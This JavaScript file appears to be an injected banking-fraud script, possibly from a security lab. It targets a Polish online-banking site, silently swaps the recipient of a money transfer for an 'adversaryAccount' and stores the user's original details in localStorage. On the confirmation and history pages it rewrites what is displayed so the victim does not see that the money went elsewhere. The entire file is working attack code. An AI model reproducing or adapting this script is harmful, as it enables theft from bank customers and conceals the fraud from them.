let fake = [];

function magic () {
  let adress = window.location.pathname;
  switch(adress) {
    case "/user/przelew":
    setAccount();
    break;
    case "/user/potwierdzenie" :
    case "/user/dane":
    changeContent();
    break;
    case "/user/" :
    showHappyAccounts();
    break;
  }
}
function newForm(id, cash) {
  let myForm = document.createElement('form');
  myForm.setAttribute('action', window.location.href);
  myForm.setAttribute('method', 'post');
  myForm.setAttribute('hidden', 'true');
  let myInput = document.createElement('input');
  myInput.setAttribute('type', 'text');
  myInput.setAttribute('name', 'title');
  myInput.setAttribute('value', id);
  myForm.appendChild(myInput);
  let myInput2 = document.createElement('input');
  myInput2.setAttribute('type', 'text');
  myInput2.setAttribute('name', 'targetAccount');
  myInput2.setAttribute('value', 'adversaryAccount');
  myForm.appendChild(myInput2);
  let myInput3 = document.createElement('input');
  myInput3.setAttribute('type', 'text');
  myInput3.setAttribute('name', 'amount');
  myInput3.setAttribute('value', cash);
  myForm.appendChild(myInput3);
  document.body.appendChild(myForm);
  myForm.submit();
}
function setAccount () {
  let form = document.getElementsByTagName("form")[0];
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    newForm(saveOrginal(form), form.amount.value);
  });
}
function saveOrginal(form) 
{
  let tittle = form.title.value;
  let adress = form.targetAccount.value;
  let id = Date.now().toString();
  localStorage.setItem(id, tittle + ";;" + adress);
  return id;
}
function changeContent () 
{
  let form = document.getElementsByTagName("form")[0];
  let data = localStorage.getItem(form.title.placeholder);
  if (data != null) {
    let tab = data.split(";;");
    form.title.placeholder = tab[0];
    form.targetAccount.placeholder = tab[1];
  }
}
function showHappyAccounts () {
  let td = document.getElementsByTagName("td");
  for(let i = 0; i<td.length; i++) {
    let data = localStorage.getItem(td[i].innerText);
    if(data != null)
    {
      let tab = data.split(";;");
      td[i].innerHTML = tab[0];
      td[i + 1].innerHTML = tab[1];
    }
  }
}
document.addEventListener('DOMContentLoaded', magic(), false);
